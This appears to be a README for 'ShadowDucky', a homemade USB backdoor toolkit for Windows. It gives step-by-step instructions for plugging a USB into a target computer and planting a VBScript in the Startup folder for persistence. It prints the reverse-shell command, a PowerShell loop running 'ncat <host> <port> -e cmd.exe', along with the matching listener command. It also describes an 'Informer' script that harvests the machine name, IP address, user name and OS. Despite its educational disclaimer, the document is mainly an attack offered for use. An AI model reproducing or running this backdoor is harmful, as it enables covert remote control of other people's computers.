# ShadowDucky-USB
This is a home made "Rubber Ducky". it gives the user a reverse shell and can grab information

------------WELCOME TO SHADOW DUCKY... -------------------------------------------------TRY AND READ THE HIDDEN MESSAGE...-----------------------------

INFO: This is a USB remote back door. This program "ShadowDucky" will run when
"ShadowDuckyV2.vsb" is double clicked. Some of the files will have to be edited
in notepad to suit it best for it's application. Please follow the listed instructions
below to help you properly run "ShadowDucky". 

This was created as a project to learn Powershell functionality, scripting with different
coding languages, and reverse shelling. This is a reverse shell for Windows to Windows.

NOTE: Required rescourses will be Powershell, Nmap, Windows.

ShadowDucky: Uses a combination of VBScript, ".bat" cmd and powershell functionality.
This program once ran will move the RubberDucky.bat into the "Intel" file and the 
"ShadowDucky.vsb" to the Startup folder to activate each time the computer starts
up and is logged into. It will continuesly ping the host computer until a connection
is made, after the host disconnects it will resume pinging until theres a new connection.
Each time the target computer is on it will allow for a reverse shell from a remote device at anypoint in time 
(as long as target device is on).

NOTE: ShadowDucky runs in the background for better use.

-------------------------------------------------------------INSTRUCTIONS-----------------------------------------------------------------------------

1st: You will need to install "nmap" on both your computer and target device in order to use ShadowDucky.
Nmap: https://nmap.org/download

2nd: You will need to place the IP of your host device into "RubberDucky.bat"
     you place IP of host and PORT being used into that function.

EX: powershell -command do {ncat FF.FF.FF.FF PORT -e cmd.exe} until ($ping) 
EX: powershell -command do {ncat 00.00.00.00 0000 -e cmd.exe} until ($ping)


3th: After settings are changed, plug ShadowDucky usb into target device
     and double click ShadowDuckyV2.vbs and watch the show.
	 return to Host device and use powershell and use the following command 
	 to connect the target device.
	 
EX: ncat -l -p PORT -v
EX: ncat -l -p 0000 -v
    make sure the port is the same number as the port set up in "RubberDucky.bat"	 

4th:ENJOY @-[:]

HIDDEN MESSAGE: sx& vqz& rlj& bulf& gost& kztg& djqp& gou& hzggtum& olt& huazj& ljf& sw& lnbulfv& sj& oubu& plndsja& lbqzjf&.& &Solfqp& qb& jqg& vqz& rljg& tuu& wu

ADVISEMENT & DISCLAIMER: This application was made for purely Educational Purposes. 
                        Developer will not be heald liable for any miss use with
                        this source code. Please be sure if you are going to use
                        "ShadowDucky" that it is on your own devices or you have
                        permission from the owner of the device(s). 
+---------+
| Shadow  |
|   Drums |
|  TM     |
+---------+
-----------------------------------------------------------------------------

--------------WELCOME TO SHADOW DUCKY INFORMER-------------------------------------------

NOTICE: USE INFORMER BEFOR SHADOWDUCKY TO GET INFO TO SET UP SHADOWDUCKY FOR USAGE

ShadowDucky Informer helps with getting the information you need in order to edit and 
use ShadowDucky. "This Informer" will give the user a print out in the ShadowDucky USB,
Intel-Report Folder. The current computers name, IPv4, User Name, and OS will be printed
out into Intel-Report.txt

--------------------------------------INSTRUCTIONS---------------------------------------

Double click Informer.vbs and wait a minute for your report to be given.
After one minute check the Intel-Report Folder and use the information
in the ".txt" to set up ShadowDucky.

TO SET UP SHADOWDUCKY:

Read the "README.txt" in the README Folder

-----------------------------------------------------------------------------------------

          DISCLAIMER:   This application was made for purely Educational Purposes. 
                        Developer will not be heald liable for any miss use with
                        this source code. Please be sure if you are going to use
                        "ShadowDucky" that it is on your own devices or you have
                        permission from the owner of the device(s).
------------
|  Shadow  |
|    Drums |
|   TM     |
------------
